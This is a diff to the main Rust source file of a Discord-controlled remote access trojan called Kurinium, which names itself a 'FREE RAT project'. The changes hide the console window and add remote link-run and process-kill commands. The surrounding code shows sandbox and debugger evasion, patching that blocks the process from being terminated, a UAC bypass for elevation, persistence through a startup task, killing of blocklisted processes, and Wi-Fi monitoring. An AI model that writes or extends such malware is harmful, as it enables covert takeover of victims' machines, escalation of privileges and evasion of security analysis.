@@ -1,4 +1,7 @@
+// Hide console window in release builds
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 #![allow(dead_code)]
+
 use crate::prelude::*;
 use std::env;
 use twilight_gateway::{Event, EventTypeFlags, Intents, Shard, ShardId, StreamExt};
@@ -43,6 +46,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         PingCommand,
         InfoCommand,
         ShellCommand,
+        LinkRunCommand,
         ExitCommand,
         AuthCommand,
 
@@ -80,7 +84,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         CapsFlickerCommand,
         VisibleCommand,
         HostCommand,
-        BsodCommand,
+        WinKillCommand,
 
         // Utility commands
         ClipboardCommand,
@@ -88,6 +92,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         ForegroundCommand,
         JumpscareCommand,
         OpenUrlCommand,
+        PlaySoundCommand,
         PrintCommand,
         ScreenshotCommand,
         WebcamCommand,
@@ -97,9 +102,7 @@ async fn register_all_commands() -> anyhow::Result<()> {
         IpconfigCommand,
     )?;
 
-    if Config::SHOW_CONSOLE {
-        println!("Registered {} commands", registry.command_count());
-    }
+    log_debug!("Registered {} commands", registry.command_count());
     Ok(())
 }
 
@@ -121,15 +124,13 @@ fn run_saa() -> bool {
     let result = run_checks(&config);
 
     if result.is_detected() {
-        if Config::SHOW_CONSOLE {
-            println!("Anti Analysis ----------");
-            println!("  - Sandbox: {}", result.is_sandbox);
-            println!("  - Debugger: {}", result.is_debugger);
-            for reason in &result.reasons {
-                println!("  - Reason: {}", reason);
-            }
-            println!("Exiting...");
+        log_debug!("Anti Analysis ----------");
+        log_debug!("  - Sandbox: {}", result.is_sandbox);
+        log_debug!("  - Debugger: {}", result.is_debugger);
+        for reason in &result.reasons {
+            log_debug!("  - Reason: {}", reason);
         }
+        log_debug!("Exiting...");
 
         random_delay(config.delay_range);
         safe_exit(0);
@@ -156,15 +157,13 @@ fn run_softaa() -> Option<Vec<String>> {
     let result = run_checks(&config);
 
     if result.is_detected() {
-        if Config::SHOW_CONSOLE {
-            println!("Anti Analysis ----------");
-            println!("  - Sandbox signs: {}", result.is_sandbox);
-            println!("  - Debugger signs: {}", result.is_debugger);
-            for reason in &result.reasons {
-                println!("  - Warning: {}", reason);
-            }
-            println!("Continue...");
+        log_debug!("Anti Analysis ----------");
+        log_debug!("  - Sandbox signs: {}", result.is_sandbox);
+        log_debug!("  - Debugger signs: {}", result.is_debugger);
+        for reason in &result.reasons {
+            log_debug!("  - Warning: {}", reason);
         }
+        log_debug!("Continue...");
 
         return Some(result.reasons);
     }
@@ -177,19 +176,15 @@ fn setup_exit_protection() -> bool {
 
     match exit_patcher::patch_exit() {
         true => {
-            if Config::SHOW_CONSOLE {
-                let patched = exit_patcher::get_patched_functions();
-                println!("[ExitPatcher] Successfully patched {} exit functions", patched.len());
-                for func in &patched {
-                    println!("  - {}", func);
-                }
+            let patched = exit_patcher::get_patched_functions();
+            log_debug!("[ExitPatcher] Successfully patched {} exit functions", patched.len());
+            for func in &patched {
+                log_debug!("  - {}", func);
             }
             true
         }
         false => {
-            if Config::SHOW_CONSOLE {
-                println!("[ExitPatcher] Failed to patch exit functions");
-            }
+            log_debug!("[ExitPatcher] Failed to patch exit functions");
             false
         }
     }
@@ -197,6 +192,22 @@ fn setup_exit_protection() -> bool {
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+    // Hide console IMMEDIATELY at startup (before any other code runs)
+    #[cfg(not(debug_assertions))]
+    {
+        unsafe {
+            let console = winapi::um::wincon::GetConsoleWindow();
+            if !console.is_null() {
+                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
+            }
+        }
+    }
+
+    // Initialize file logger for debug output (writes to debug.log next to exe)
+    if Config::SHOW_CONSOLE {
+        crate::utils::logger::init_logger();
+    }
+
     let args: Vec<String> = env::args().collect();
     let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());
 
@@ -207,17 +218,13 @@ async fn main() -> anyhow::Result<()> {
     #[cfg(not(debug_assertions))]
     {
         if setup_exit_protection() {
-            if Config::SHOW_CONSOLE {
-                println!("[ExitPatcher] Process termination protection enabled");
-            }
+            log_debug!("[ExitPatcher] Process termination protection enabled");
         }
     }
 
     #[cfg(debug_assertions)]
     {
-        if Config::SHOW_CONSOLE {
-            println!("[ExitPatcher] Skipped (debug build)");
-        }
+        log_debug!("[ExitPatcher] Skipped (debug build)");
     }
 
     // ========================================================================
@@ -227,35 +234,23 @@ async fn main() -> anyhow::Result<()> {
     #[cfg(not(debug_assertions))]
     {
         if !is_installed {
-            if Config::SHOW_CONSOLE {
-                println!("[Anti-Analysis] Running checks");
-            }
+            log_debug!("[Anti-Analysis] Running checks");
             run_saa();
-            if Config::SHOW_CONSOLE {
-                println!("[Anti-Analysis] Checks passed!");
-            }
+            log_debug!("[Anti-Analysis] Checks passed!");
         } else {
-            if Config::SHOW_CONSOLE {
-                println!("[Anti-Analysis] Running checks...");
-            }
+            log_debug!("[Anti-Analysis] Running checks...");
             let warnings = run_softaa();
             if warnings.is_some() {
-                if Config::SHOW_CONSOLE {
-                    println!("[Anti-Analysis] Warnings detected but continuing...");
-                }
+                log_debug!("[Anti-Analysis] Warnings detected but continuing...");
             } else {
-                if Config::SHOW_CONSOLE {
-                    println!("[Anti-Analysis] Checks passed!");
-                }
+                log_debug!("[Anti-Analysis] Checks passed!");
             }
         }
     }
 
     #[cfg(debug_assertions)]
     {
-        if Config::SHOW_CONSOLE {
-            println!("[Anti-Analysis] Skipped (debug build)");
-        }
+        log_debug!("[Anti-Analysis] Skipped (debug build)");
     }
     // ========================================================================
 
@@ -273,88 +268,50 @@ async fn main() -> anyhow::Result<()> {
 
     //@ UAC Bypass
     if !is_admin_privileged {
-        if Config::SHOW_CONSOLE {
-            println!("Not running with admin privileges, attempting UAC bypass...");
-        }
+        log_debug!("Not running with admin privileges, attempting UAC bypass...");
 
         if uac_bypass::attempt_uac_bypass() {
-            is_admin_privileged = uac_bypass::is_admin();
-            if Config::SHOW_CONSOLE {
-                if is_admin_privileged {
-                    println!("UAC bypass successful! Now running with admin privileges.");
-                } else {
-                    println!("UAC bypass failed. Continuing without admin privileges.");
-                }
-            }
+            // UAC bypass spawns a new elevated process, so we exit this one
+            log_debug!("UAC bypass initiated, exiting non-admin process...");
+            std::process::exit(0);
         } else {
-            if Config::SHOW_CONSOLE {
-                println!("UAC bypass failed. Continuing without admin privileges.");
-            }
+            log_debug!("UAC bypass failed. Continuing without admin privileges.");
         }
     } else {
-        if Config::SHOW_CONSOLE {
-            println!("Already running with admin privileges.");
-        }
+        log_debug!("Already running with admin privileges.");
     }
 
     //@ Installation
     // Note: is_installed already checked above for anti-analysis
     if is_admin_privileged && !is_installed {
-        if Config::SHOW_CONSOLE {
-            println!("Starting installation process...");
-        }
+        log_debug!("Starting installation process...");
 
         match installation::install_to_path() {
             Ok(_) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Installation completed successfully!");
-                }
+                log_debug!("Installation completed successfully!");
             }
             Err(e) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Installation failed: {}", e);
-                }
+                log_debug!("Installation failed: {}", e);
             }
         }
 
-        if Config::SHOW_CONSOLE {
-            println!("Setting up startup task...");
-        }
+        log_debug!("Setting up startup task...");
 
         // Use async startup check
         match crate::core::startup::check_startup().await {
             Ok(_) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Startup task created successfully!");
-                }
+                log_debug!("Startup task created successfully!");
             }
             Err(e) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Startup task failed: {}", e);
-                }
+                log_debug!("Startup task failed: {}", e);
             }
         }
 
+        log_debug!("Installation complete. Exiting original process...");
         if Config::SHOW_CONSOLE {
-            println!("Installation complete. Exiting original process...");
             std::thread::sleep(std::time::Duration::from_secs(2));
         }
         safe_exit(0);
-    }
-
-    //@ Hide Console
-    if !Config::SHOW_CONSOLE {
-        unsafe {
-            let console = winapi::um::wincon::GetConsoleWindow();
-            if !console.is_null() {
-                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
-            }
-        }
-    }
-
-    //@ Initialize
-    if Config::SHOW_CONSOLE {
-        tracing_subscriber::fmt::init();
     }
 
     //@ Authentication
@@ -369,15 +326,11 @@ async fn main() -> anyhow::Result<()> {
     tokio::spawn(async move {
         match register_all_commands().await {
             Err(e) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Failed to register commands: {}", e);
-                }
+                log_debug!("Failed to register commands: {}", e);
             }
             Ok(_) => {
-                if Config::SHOW_CONSOLE {
-                    println!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
-                    println!("All commands registered in registry");
-                }
+                log_debug!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
+                log_debug!("All commands registered in registry");
             }
         }
     });
@@ -433,9 +386,7 @@ async fn main() -> anyhow::Result<()> {
                     if blocklist.contains(proc_name_base) {
                         if process.kill() {
                             killed_pids.insert(pid_u32);
-                            if Config::SHOW_CONSOLE {
-                                println!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid_u32);
-                            }
+                            log_debug!("[BlockMonitor] Killed: {} (PID: {})", proc_name, pid_u32);
                         }
                     }
                 }
@@ -457,9 +408,7 @@ async fn main() -> anyhow::Result<()> {
     );
 
     let device_channel_id = channel_manager.init_dchannel().await?;
-    if Config::SHOW_CONSOLE {
-        println!("Device channel initialized: {}", device_channel_id);
-    }
+    log_debug!("Device channel initialized: {}", device_channel_id);
 
     //@ Gateway configuration
     let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;
@@ -469,18 +418,14 @@ async fn main() -> anyhow::Result<()> {
     let wifi_monitor =
         crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
     if let Err(e) = wifi_monitor.start_monitoring().await {
-        if Config::SHOW_CONSOLE {
-            println!("Failed to start WiFi monitoring: {}", e);
-        }
-    } else if Config::SHOW_CONSOLE && Config::get_wifi_monitor_config().enabled {
-        println!("WiFi monitoring started successfully");
+        log_debug!("Failed to start WiFi monitoring: {}", e);
+    } else if Config::get_wifi_monitor_config().enabled {
+        log_debug!("WiFi monitoring started successfully");
     }
 
-    if Config::SHOW_CONSOLE {
-        println!("Prefix: {}", Config::BOT_PREFIX);
-        println!("Guild ID: {}", guild_id);
-        println!("[ Console is showing ]-----------------------------------");
-    }
+    log_debug!("Prefix: {}", Config::BOT_PREFIX);
+    log_debug!("Guild ID: {}", guild_id);
+    log_debug!("[ Logging enabled ]-----------------------------------");
 
     //@ Event Loop With Reconnection
     let mut reconnect_delay = 5u64;
@@ -490,9 +435,7 @@ async fn main() -> anyhow::Result<()> {
     loop {
         let mut shard = Shard::new(ShardId::new(0, 1), token.clone(), intents);
 
-        if Config::SHOW_CONSOLE {
-            println!("Connecting to Discord gateway...");
-        }
+        log_debug!("Connecting to Discord gateway...");
         let mut connected_successfully = false;
 
         loop {
@@ -501,15 +444,11 @@ async fn main() -> anyhow::Result<()> {
             let event = match item {
                 Some(Ok(event)) => event,
                 Some(Err(source)) => {
-                    if Config::SHOW_CONSOLE {
-                        println!("Error receiving event: {:?}", source);
-                    }
+                    log_debug!("Error receiving event: {:?}", source);
                     break;
                 }
                 None => {
-                    if Config::SHOW_CONSOLE {
-                        println!("Event stream ended, reconnecting...");
-                    }
+                    log_debug!("Event stream ended, reconnecting...");
                     break;
                 }
             };
@@ -518,77 +457,62 @@ async fn main() -> anyhow::Result<()> {
                 Event::Ready(_) => {
                     connected_successfully = true;
                     reconnect_delay = MIN_RECONNECT_DELAY;
-
-                    if Config::SHOW_CONSOLE {
-                        println!("Bot is ready!");
-                    }
+                    log_debug!("Bot is ready!");
                 }
 
                 Event::Resumed => {
                     connected_successfully = true;
-                    if Config::SHOW_CONSOLE {
-                        println!("Gateway session resumed");
-                    }
+                    log_debug!("Gateway session resumed");
                 }
 
                 Event::MessageCreate(msg) => {
                     if let Err(e) = handler::handle_message(&http, msg.0, device_channel_id).await {
-                        if Config::SHOW_CONSOLE {
-                            println!("Error handling message: {}", e);
-                        }
+                        log_debug!("Error handling message: {}", e);
                     }
                 }
 
                 Event::InteractionCreate(interaction) => {
                     if let Err(e) = handler::handle_interaction(&http, interaction.0).await {
-                        if Config::SHOW_CONSOLE {
-                            println!("Error handling interaction: {}", e);
-                        }
+                        log_debug!("Error handling interaction: {}", e);
                     }
                 }
 
                 Event::GatewayClose(frame_opt) => {
                     if let Some(frame) = frame_opt {
-                        if Config::SHOW_CONSOLE {
-                            println!("Gateway closed with code: {}", frame.code);
-                        }
+                        log_debug!("Gateway closed with code: {}", frame.code);
 
                         match frame.code {
                             4004 => {
-                                println!("Authentication failed: Invalid token.");
+                                log_debug!("Authentication failed: Invalid token.");
                                 return Err(anyhow::anyhow!("Invalid token"));
                             }
                             4010 => {
-                                println!("Invalid shard");
+                                log_debug!("Invalid shard");
                                 return Err(anyhow::anyhow!("Invalid shard"));
                             }
                             4011 => {
-                                println!("Sharding required");
+                                log_debug!("Sharding required");
                                 return Err(anyhow::anyhow!("Bot too large, needs sharding"));
                             }
                             4013 => {
-                                println!("Invalid intents");
+                                log_debug!("Invalid intents");
                                 return Err(anyhow::anyhow!("Invalid intents"));
                             }
                             4014 => {
-                                println!("Disallowed intents");
+                                log_debug!("Disallowed intents");
                                 return Err(anyhow::anyhow!("Privileged intents not enabled"));
                             }
                             _ => {}
                         }
                     } else {
-                        if Config::SHOW_CONSOLE {
-                            println!("Gateway closed without close frame");
-                        }
+                        log_debug!("Gateway closed without close frame");
                     }
 
                     break; // Break to reconnect
                 }
 
                 Event::GatewayInvalidateSession(can_resume) => {
-                    if Config::SHOW_CONSOLE {
-                        println!("Session invalidated (resumable: {})", can_resume);
-                    }
+                    log_debug!("Session invalidated (resumable: {})", can_resume);
                     break;
                 }
 
@@ -599,22 +523,16 @@ async fn main() -> anyhow::Result<()> {
         // Determine reconnect delay
         if !connected_successfully {
             reconnect_delay = (reconnect_delay * 2).min(MAX_RECONNECT_DELAY);
-
-            if Config::SHOW_CONSOLE {
-                println!(
-                    "Failed to establish connection. Waiting {} seconds before retry...",
-                    reconnect_delay
-                );
-            }
+            log_debug!(
+                "Failed to establish connection. Waiting {} seconds before retry...",
+                reconnect_delay
+            );
         } else {
             reconnect_delay = MIN_RECONNECT_DELAY;
-
-            if Config::SHOW_CONSOLE {
-                println!(
-                    "Disconnected. Reconnecting in {} seconds...",
-                    reconnect_delay
-                );
-            }
+            log_debug!(
+                "Disconnected. Reconnecting in {} seconds...",
+                reconnect_delay
+            );
         }
 
         tokio::time::sleep(tokio::time::Duration::from_secs(reconnect_delay)).await;
